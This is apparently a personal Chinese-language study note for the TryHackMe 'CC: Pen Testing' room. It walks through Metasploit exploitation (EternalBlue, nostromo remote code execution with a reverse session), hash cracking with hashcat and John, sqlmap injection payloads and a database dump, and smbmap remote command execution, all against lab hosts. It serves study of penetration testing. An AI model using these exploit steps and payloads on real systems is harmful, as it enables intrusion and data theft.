---
title: 'CC Pen Testing|Writeup|Note'
date: 2021-06-08 17:48:19
tags: [靶场,THM]
published: true
hideInList: false
feature: 
isTop: false
---
# CC: Pen Testing|Writeup|Note

[TryHackMe | CC: Pen Testing](https://tryhackme.com/room/ccpentesting)

## **Metasploit**

竟然用了三个section来将这个metasploit。。。

### section 3 - Metasploit: Selectiong a module

当你遇到想要利用的漏洞到特定的机器上，需要设置合适的选项（options），这个任务帮助你为最流行的metasploit模组“永恒之蓝” 选择和设置options。所有基本的命令都可以在选择模组之前，也可以在选择模组之后。因为这个题目是让你学会使用内部命令学习操作方式，所以我学习的方式就是输入一个help，然后对某个具体的command再进行一遍help <command>

选择模组：

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

设置目标hosts的option

```bash
RHOSTS
```

设置目标port的option

```bash
RPORT
```

用来设置option的命令

```bash
set
```

如何设置SMBPass为username

```bash
set SMBPass username
```

如何设置SMBUser为password

```bash
set SMBUser password
```

What option sets the architecture to be exploited? (不太懂这个）

```bash
ARCH
```

哪一个option用来设置发送给目标机器的payload

```bash
payload
```

当你设置完了全部要求的options，如何运行exploit

```bash
exploit
```

哪一个flag可以设为后台运行

```bash
-j
```

然后是列出全部的session和进入一个可交互的session中。其实都用命令`help sessions` 就可以查出来了

### section 3-Metasploit:meterpreter

metasploit是msf入侵成功后，和被入侵的机器进行交互的一个msf模块。具体的使用教程看这里：[https://www.cnblogs.com/backlion/p/9484949.html](https://www.cnblogs.com/backlion/p/9484949.html)

如何获取到的是cmdshell的机器，那么可以考虑把对面的机器作为跳板，升级为meterpreter

如何升级？

```bash
sessions -u <opt>
```

[Copy of View](https://www.notion.so/6f918dbfaaeb4649a6860208a9c96f43)

### Section3-Metasploit: Final Walkthrough

在一台机子上进行实战测试，目标主机在80端口上存在漏洞，能被msf的exploit/multi/http/nostromo_code_exec 模块利用。

参考：[https://ryankozak.com/hack-the-box-craft-traverxec/](https://ryankozak.com/hack-the-box-craft-traverxec/)

总是在exploit命令执行提示失败，查看网上网友[视频](https://www.youtube.com/watch?v=6USFMv6BWOc)[43:49]

第一步：选择模块

```rust
use exploit/multi/http/nostromo_code_exec
```

第二步 设置远程目标机器ip

```rust
set RHOSTS 10.10.129.133
```

第三步 设置远程目标机器端口

```rust
set RPORT 80
```

设置监听地址（为VPN提供的地址）

```rust
set LHOST 10.2.74.194
```

设置监听port（一直以为也是80 原来是考察具体的漏洞，是1337）

```rust
set LPORT 1337
```

[https://cd6629.gitbook.io/ctfwriteups/linux-privesc/cc-pen-testing](https://cd6629.gitbook.io/ctfwriteups/linux-privesc/cc-pen-testing)

出现Exploit completed, but no session was created的原因：LHOST应设为能够链接到ip的当前vpn的地址

出现链接成功后：输入`shell` 进入session （输入`help`提示）

![](https://i.loli.net/2021/06/08/YUldSLhzCiVqIAc.png)

## **Salting and Formatting**

盐的格式：

`<hash1>:<salt>`

## **hashcat**

一款hash破解工具

mode对应的md5类型表：[https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

设置mode的flag

```json
-m
```

设置"attack mode"的flag

```json
-a
```

去破解`56ab24c15b72a457069c5ea42fcfc640`

需要将hash保存到本地文件中，然后hashcat自带的字典是rockyou.txt(/usr/share/wordlist/rockyou.txt)。非kali系统可能需要自行[下载](https://github.com/brannondorsey/naive-hashcat/releases)。

```json
hashcat -a 3 -m 0 ~/wordlist/hashcat/test.txt   ~/wordlist/hashcat/rockyou.txt --force
```

同理MD4。mode换为MD4对应的900就好

## **john the ripper**

也是一款hash工具

非kali需要用snap下载最新版（不然format=raw-md5在1.9版本以下不识别)

`sudo apt install snapd`

`sudo snap install john-the-ripper`

选择wordlist

```json
--wordlist
```

选择hash类型

```json
--format
```

设置规则

```json
--rules
```

Crack this hash:

**5d41402abc4b2a76b9719d911017c592**

Type: MD5

```json
john  --format=Raw-MD5 --wordlist=rockyou.txt md5.hash #创建破解任务
john --show md5.hash --format=Raw-MD5 #查看所有已破解的值
```

Crack this hash:

5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

Type: SHA1

```json
john  --format=Raw-SHA1 --wordlist=rockyou.txt sha1.txt

```

## **sqlmap**

### Section5-sqlmap

`-hh`查看更多帮助

指定url

```json
-u
```

使用google dork（试了一下好像能够给出我的用户名，搜索出有哪些网站

```json
-g
```

增加参数（例如url中的[http://ex.com?test=1](http://ex.com/?test=1) 的参数为test)

```json
-p
```

说明后端指定的数据库类型

```json
--dbms
```

sqlmap渗透等级（等级越高越精确)

```json
--level
```

如何获取数据库下的全部表

```json

--dump
```

选择要枚举的数据库

```json
	-D
```

选择要枚举的数据库的表

```json
-T
```

选择要枚举的数据表的column

```json
-C
```

获取shell交互

```json
--os-shell
```

哪一个flag是从所有表中dump全部数据

```json
--dump-all
```

### Section5-A Note on Manual SQL Injection

有时候不能使用sqlmap有以下情况：

- 对方有防火墙
- 有请求次数限制

接下来section的part将介绍手动注入，参考见[https://www.owasp.org/index.php/SQL_Injection](https://www.owasp.org/index.php/SQL_Injection)

### Section5-Vulnerable Web Application

实战。

对目标ip进行sqlmap（因为没有get的p参数，所以用了—forms）

```json
python sqlmap.py -u http://10.10.27.86  --forms --dbs --level 1
```

运行内容截取 🍈

```bash
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
结果： 
Parameter: msg (POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: msg=ldLL' RLIKE (SELECT (CASE WHEN (8089=8089) THEN 0x6c644c4c ELSE 0x28 END))-- Hukx
Type: error-based
Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
Payload: msg=ldLL' AND GTID_SUBSET(CONCAT(0x7171627a71,(SELECT (ELT(8564=8564,1))),0x717a7a7071),8564)-- ANkH
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: msg=ldLL' AND (SELECT 9863 FROM (SELECT(SLEEP(5)))uRim)-- UOih
[23:24:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 7.0.33
back-end DBMS: MySQL >= 5.6
[23:24:35] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/nnkmeopw/snap/sqlmap/18/.local/share/sqlmap/output/results-06072021_1111pm.csv'

web server operating system: Linux Ubuntu
web application technology: PHP 7.0.33
back-end DBMS: MySQL >= 5.6
[04:44:16] [INFO] fetching database names
[04:44:17] [INFO] retrieved: 'information_schema'
[04:44:18] [INFO] retrieved: 'mysql'
[04:44:18] [INFO] retrieved: 'performance_schema'
[04:44:18] [INFO] retrieved: 'sys'
[04:44:19] [INFO] retrieved: 'tests'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] tests
```

现在知道有三个类型的sql漏洞，一共5个数据库

dump数据库

```tsx
python sqlmap.py -u http://10.10.27.86  --forms -D tests --dump

```

## **Samba**

samba 在windows渗透中最常见到的。

### Section6-smbmap

smbmap是最常用的枚举smb的工具

设置验证的用户名

```tsx
-u
```

设置password

```tsx
-p
```

设置host

```tsx
-H
```

假设你有权限，如何在服务器上运行命令

```tsx
-x
```

设置要枚举的共享对象

```tsx
-s
```

枚举的域名

```tsx
-d
```

哪一个flag来下载保存为一个文件

```tsx
--download
```

上传

```tsx
--upload
```

Given the username "admin", the password "password", and the ip "10.10.10.10", how would you run ipconfig on that machine （啊这个引号。。。）

```tsx
smbmap -u "admin" -p "password" -h 10.10.10.10  -x 'ipconfig'
```

### Section6-smbclient

也是一款针对samba的工具,samba不太懂，怕翻译错。随机翻译

How do you specify which domain(workgroup) to use when connecting to the host?

```tsx
-W
```

How do you specify the ip address of the host?

```tsx
-I
```

How do you run the command "ipconfig" on the target machine?

```tsx
-c "ipconfig
```

How do you specify the username to authenticate with?

```tsx
-U
```

How do you specify the password to authenticate with?

```tsx
-P
```

What flag is set to tell smbclient to not use a password?

```tsx
-N
```

While in the interactive prompt, how would you download the file test, assuming it was in the current directory?

```tsx
get test
```

In the interactive prompt, how would you upload your /etc/hosts file

```tsx
put /etc/hosts
```

### Section6-A note about impacket

impacket is a collection of extremely useful windows scripts. It is worth mentioning here, as it has many scripts available that use samba to enumerate and even gain shell access to windows machines. All scripts can be found [here.](https://github.com/SecureAuthCorp/impacket)

另一个samba的工具。

## **Miscellaneout**

权限提升，没有题目， 但是这里给出了一些不同平台下的权限提升的笔记和教程

privilege escalation is such a large topic that it would be impossible to do it proper justice in this type of room. However, it is a necessary topic that must be covered, so rather than making a task with questions, I shall provide you all with some resources.

General:

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (A bunch of tools and payloads for every stage of pentesting)

Linux:

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) (a bit old but still worth looking at)

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) (One of the most popular priv esc scripts)

[https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh) (Another popular script)

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (A Script that's dedicated to searching for kernel exploits)

[https://gtfobins.github.io](https://gtfobins.github.io/) (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)

Windows:

[https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)  (Dictates some very useful commands and methods to enumerate the host and gain intel)

[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) (A bit old but still an incredibly useful script)

[https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS) (A general enumeration script)